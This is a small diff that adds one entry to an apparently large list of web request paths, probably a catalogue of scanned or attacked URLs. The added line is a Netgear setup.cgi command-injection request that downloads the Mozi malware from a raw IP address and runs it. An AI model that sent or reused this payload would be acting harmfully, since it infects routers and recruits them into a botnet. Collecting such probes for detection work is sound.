@@ -50264,3 +50264,4 @@ http://ifconfig.me/
 /wp-content/plugins/cve-2024-46188/views/viewsecurity.php
 /.well-known/api-catalog
 /sites/all/modules/contrib/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://39.79.84.37:35057/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
